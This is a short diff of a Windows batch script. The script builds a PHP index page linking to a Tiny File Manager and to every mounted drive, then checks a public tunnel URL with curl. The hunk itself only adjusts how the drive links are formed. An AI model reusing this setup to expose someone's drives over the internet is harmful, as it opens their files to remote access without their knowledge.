@@ -78,7 +78,7 @@ if not errorlevel 1 (set LS="%WS%!newtemp!") else (set LS="Off")
 powershell.exe Remove-Item -Force "C:\drives.html"
 powershell.exe Remove-Item -Force "%environment%\apache2\php\index.php"
 echo ^<a href="%WS%tinyfilemanager.php"^>TFM^</a^>^<br^> > "%environment%\apache2\php\index.php"
-FOR /F "usebackq tokens=1" %%a IN (`MOUNTVOL ^| FIND ":\"`) DO (FOR /F "usebackq tokens=3" %%b IN (`FSUTIL FSINFO DRIVETYPE %%a`) DO (set drive=%%a && echo ^<a href="%WS%disk!drive:~0,-3!"^>%%a^</a^>^<br^> >> "%environment%\apache2\php\index.php"))
+FOR /F "usebackq tokens=1" %%a IN (`MOUNTVOL ^| FIND ":\"`) DO (FOR /F "usebackq tokens=3" %%b IN (`FSUTIL FSINFO DRIVETYPE %%a`) DO (set drive=%%a && echo ^<a href="%WS%!drive:~0,-2!"^>%%a^</a^>^<br^> >> "%environment%\apache2\php\index.php"))
 
 for /f "tokens=1" %%i in ('%environment%\curl.exe -k -H "Bypass-Tunnel-Reminder: 1" %WS%') do set "status=%%i"
 if "%status%"=="404" (
